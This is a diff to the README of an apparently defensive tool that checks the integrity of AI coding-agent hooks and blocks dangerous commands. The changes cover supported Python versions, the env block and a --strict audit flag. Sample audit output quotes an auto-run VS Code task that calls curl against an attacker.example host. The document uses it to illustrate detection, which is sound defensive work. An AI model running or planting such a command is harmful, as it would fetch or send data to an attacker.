@@ -27,7 +27,7 @@ Designed for:
 - **Git, to share the baseline.** Commit `.claude/hook-integrity.json` so every checkout compares
   against the same review.
 
-Python standard library only, Python 3.9 to 3.14, no network.
+Python standard library only, Python 3.11 to 3.14, no network.
 
 ## Quick start
 
@@ -63,7 +63,7 @@ naming the settings change.
 | When | Command | What it does |
 |---|---|---|
 | Setup | `install` | Prints a `hooks` block: a session-start check and three guards that run before each tool call. Writes nothing. |
-| After review | `bless` | Records a SHA-256 of each hook, the project files it runs, what Python imports for it, and the settings `hooks` block. Lists every file. |
+| After review | `bless` | Records a SHA-256 of each hook, the project files it runs, what Python imports for it, and the settings `hooks` and `env` blocks. Lists every file. |
 | Any time | `verify` | Compares the project with that baseline: on demand, in CI, and at session start. |
 | Every tool call | `check-command`, `check-write`, `check-gate-config` | Refuse dangerous shell commands, changes to hook registrations, self-blessing and weakened test configs, and tell the agent to ask you. |
 | A hook changed on purpose | `bless --diff` | Writes the new baseline and prints what changed, with the git diff. |
@@ -90,7 +90,8 @@ AUTO-RUN VS Code task 'setup' (.vscode/tasks.json): curl -s https://attacker.exa
 audit: 2 item(s) run on their own, 2 flagged
 ```
 
-`!` lines fail the audit (exit 1); `?` lines are for review. The
+`!` lines fail the audit (exit 1); `?` lines are for review. To fail on anything that runs
+unasked, flagged or not (a CI gate, or a check before you open a checkout), add `--strict`. The
 [case-studies](https://github.com/lockesec/case-studies) Mini Shai-Hulud write-up re-runs
 this tool.
 
@@ -132,7 +133,7 @@ Background: [DESIGN.md](DESIGN.md#why-it-exists).
    refused ([DESIGN.md](DESIGN.md)).
 6. **Planted modules do not load.** The hook command drops relative `sys.path` entries, so a
    `json.py` or `hook_integrity_kit/` in the project cannot replace the guards (tested).
-7. **Tested in CI** on Python 3.9 to 3.14; each review finding was pinned to a test before
+7. **Tested in CI** on Python 3.11 to 3.14; each review finding was pinned to a test before
    its fix ([DESIGN.md](DESIGN.md)).
 
 Each point in full: [docs/how-it-works.md](docs/how-it-works.md#why-you-can-trust-it).
